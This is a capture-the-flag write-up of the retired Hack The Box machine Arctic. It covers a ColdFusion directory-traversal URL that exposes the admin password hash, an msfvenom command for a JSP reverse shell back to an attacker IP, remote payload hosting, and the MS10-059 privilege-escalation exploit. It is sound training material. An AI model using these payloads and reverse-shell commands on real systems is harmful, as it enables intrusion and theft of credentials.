---
title: Keep Calm and Hack The Box - Arctic
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-02-26T22:19:29.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-arctic
coverImage: https://www.freecodecamp.org/news/content/images/2020/02/8hAf8sI.png
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
- name: Windows
  slug: windows
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.06.12.png)

Arctic is a beginner-level machine, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* nmap
* Searchsploit
* hash-identifier
* MSFvenom
* netcat
* GDSSecurity/Windows-Exploit-Suggester
* python http server
* powershell

## Step 1 - Reconnaissance

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.

## Ports scanning

I will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. 

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.50.12.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v 10.10.10.11
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**10.10.10.11:** IP address of the Arctic box

If you find the results a little bit too overwhelming, you can do another command to get only the open ports.

```bash
nmap 10.10.10.11
```

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.51.47.png)

We can see that there are 3 open ports:

**Port** 135. Microsoft EPMAP (End Point Mapper), also known as DCE/RPC Locator service, used to remotely manage services including DHCP server, DNS server and WINS

**Port** 8500. Adobe ColdFusion built-in web server

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.33.09.png)

**Port** 49154. Certificate Management over CMS

For now, Adobe ColdFusion, which is running on port 8500, will be the primary target.

## **Step 2 - Enumeration**

Let's try the **port 8500** and visit **http://10.10.10.11:8500**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.13.37.png)

We can see two folders. I open the CFIDE folder.

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.25.16.png)

It seems to be a web application with a ColdFusion administration panel at the following address:

```bash
10.10.10.11:8500/CFIDE/administrator/
```

For more information on ColdFusion, check [here](https://en.wikipedia.org/wiki/Adobe_ColdFusion).

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.26.22.png)

I use **Searchsploit** to check if there is any known vulnerability on ColdFusion. Searchsploit is a command line search tool for **[Exploit Database](https://www.exploit-db.com/).**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.45.47.png)

I use the following command:

```bash
searchsploit coldfusion
```

We can also find the exploit on the Exploit Database website:

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.01.42.png)
_[https://www.exploit-db.com/exploits/14641](https://www.exploit-db.com/exploits/14641)_

I have a look at the description of the exploit:

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.01.57.png)

And replace the **server** bit by **10.10.10.11:8500**

```bash
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

I can see that the hashed password is now visible on the page in between the inputs:

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.03.01.png)

I use **hash-identifier** to identify the possible hash. hash-identifier is a software to identify the different types of hashes used to encrypt data and especially passwords. You can find more information [here](https://tools.kali.org/password-attacks/hash-identifier).

I launch hash-identifier with the following command:

```bash
hash-identifier
```

and copy/paste the hashed password I got earlier:

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.28.06.png)

We see the hash is most likely to be a SHA-1.

## Step 3 - Crack SHA 1 with hashtoolkit.com

I go to the website [hashtoolkit](http://hashtoolkit.com/) to 'unhash' the hash. Hash functions are built in a way that it's very easy to generate a hash / fingerprint for a text, but almost impossible to decode the hash back to the original text. 

It is important to note that hashing is a one way mechanism. Thus the data that was hashed can not be reversed practically or be "unhashed".

The website is using **rainbow tables** for reversing cryptographic **hash** functions, usually for cracking password **hashes**. More info on the rainbow tables [here](https://en.wikipedia.org/wiki/Rainbow_table).

I copy/paste the hash and got the password back: **happyday.**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.14.43.png)

You can also see the different hash for this same password:

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.14.52.png)

Currently the website has almost 17 billion decrypted MD5 and SHA1 password hashes:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.12.44.png)

## Step 4 - Create a Scheduled Task

I use the password to log into the portal:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.27.41.png)

I can see an area on the left sidebar that should allow uploads via Scheduled Tasks under the Debugging & Logging category:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.28.57.png)

I can create a new task:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.29.57.png)

On the page, I will have to set up the task with the different parameters:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.31.03.png)

I check the **Mappings** to see the CFIDE path - one of the two folders we found at the beginning - and know where I can save the shell:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.33.22.png)

I will use **msfvenom**, which is a payload generator, to craft the exploit - and more specifically a **jsp** reverse shell. This piece of information has been collected during recon phase - looking at the wikipedia page of ColdFusion, we can see it is written in Java:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.25.07.png)

You can learn more about msfvenom [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/). 

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.45.53.png)

I use the following command to create the payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f raw > arcticshell.jsp
```

**-**p**:** Payload to use

**-**f**:** Output format

**LHOST**:**** Local host

**LPORT**:**** Local port

I saved the exploit as **arcticshell.jsp**. I can see the content of the payload with the following command:

```bash
cat arcticshell.jsp
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.45.39.png)

Let's fire up a Python server to serve the file from Kali. I will use the **SimpleHTTPServer**. The SimpleHTTPServer module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers. You can learn more on that [here](https://docs.python.org/2/library/simplehttpserver.html).

I use the following command to create a simple server:

```bash
python -m SimpleHTTPServer 80
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.51.00.png)

Back to the ColdFusion panel, I configure the following parameters for the Scheduled Task.

First I set up the URL to our webserver which is hosting the shell we created with msfvenom:

```bash
http://10.10.14.51/arcticshell.jsp
```

Then I check the box to save the output to a file.

Finally I set the file to the following path:

```bash
C:\ColdFusion8\wwwroot\CFIDE\arcticshell.jsp
```

Here is what I have when finishing setting all the parameters:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.01.14.png)

Under the Actions on the left side, I click on the first button to run the task. I can see a green message at the top of the page to let me know the scheduled task was completed successfully:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-21.58.56.png)

I can also see a 200 response on my python http server:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-21.59.43.png)

I set up a **Ncat** listener on port **443** to catch the reverse shell connection.

> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable [Netcat](http://sectools.org/tool/netcat/). It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users.

You can learn more about Ncat [here](https://nmap.org/book/ncat-man.html).

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.03.42.png)

I then browse to the shell at:

```bash
http://10.10.10.11:8500/CFIDE/arcticshell.jsp
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.02.27.png)

I finally got a shell!

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.04.19.png)

## Step 5 - Looking for the user.txt flag

I check who I am on the machine with the command

```bash
whoami
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.05.51.png)

I list the files/folders with

```bash
dir
```

I navigate to Users

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.06.27.png)

Then I move to the tolis folder

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.06.44.png)

I navigate to the Desktop

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.07.46.png)

And I find the user.txt file!

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.08.02.png)

To read the content of the file I use the command

```bash
more user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.09.13.png)

## Step 6 - **Using** GDSSecurity/**Windows-Exploit-Suggester**

I look at the system information with the command

```bash
systeminfo
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.10.09.png)

I copy/paste the findings on a **systeminfo.txt** file:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.53.30.png)

I will use Windows-Exploit-Suggester from [GDSSecurity](https://github.com/AonCyberLabs/Windows-Exploit-Suggester):

> This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

> It requires the 'systeminfo' command output from a Windows host in order to compare that the Microsoft security bulletin database and determine the patch level of the host.

> It has the ability to automatically download the security bulletin database from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

I copy/paste the raw windows-exploit-suggester python script on a file and then modify the file 

```bash
nano windows-exploit-suggester.py
```

to paste the code from the [GitHub repository](https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py). We now have our 2 files into the same folder, **systeminfo.txt** and **windows-exploit-suggester.py:**

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.54.18.png)

I can find out more about this tool with the following command:

```bash
python windows-exploit-suggester.py -h
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.56.png)

I update the database of the tool with the following command:

```bash
python windows-exploit-suggester.py --update
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.55.08.png)

I run the script with

```bash
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2020-02-25-mssb.xls
```

If you run into an error, you will need to install **pip** before install **xlrd**. You can install pip on Kali with the following command:

```bash
apt install python-pip
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.56.14.png)

Then you can install wlrd with the command

```bash
pip install xlrd
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.56.59.png)

I can see that there are several missing CVEs on this machine. I will target the **MS10-059** vulnerability:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.57.09.png)

## Step 7 - **Performing privilege escalation**

I look at the Microsoft website to get more information from their Security Bulletin:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.46.50.png)
_[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059)_

I have a look at the Exploit Database:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.15.45.png)
_[https://www.exploit-db.com/exploits/14610](https://www.exploit-db.com/exploits/14610)_

I also have a look at the National Vulnerability Database. More info on NVD [here](https://nvd.nist.gov/).

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.49.22.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2010-2554](https://nvd.nist.gov/vuln/detail/CVE-2010-2554)_

I find an executable on GitHub [here](https://github.com/Re4son/Chimichurri) that I can download. The exploit will create a reverse shell.

I create a new python http server with

```bash
python -m SimpleHTTPServer 80
```

Back to the shell where I got the user flag, I set up a webclient with the URL of the exploit and the file where the exploit will be saved:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.22.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.35.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.45.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.53.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.14.png)

I'm getting a 200 on the python http server:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.01.37.png)

I set up a new netcat and launch the exploit with the following command:

```bash
exploit.exe 10.10.14.20 443
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.21.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.30.png)

## Step 8 - Looking for the root.txt flag

I can see that the privilege escalation was a success by checking who I am on the machine:

```bash
whoami
```

 It returns

```bash
nt authority\system
```

I am admin:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.02.50.png)

I navigate to Users:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.03.47.png)

I move to the Administrator folder:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.03.58.png)

I navigate to the Desktop folder:

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.20.png)

I can see the root.txt flag!

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.29.png)

I use the following command to see the content of the file:

```bash
more root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.39.png)

Congrats! You found both flags!

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Keep Calm and Hack The Box - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/8hAf8sI-1.png)


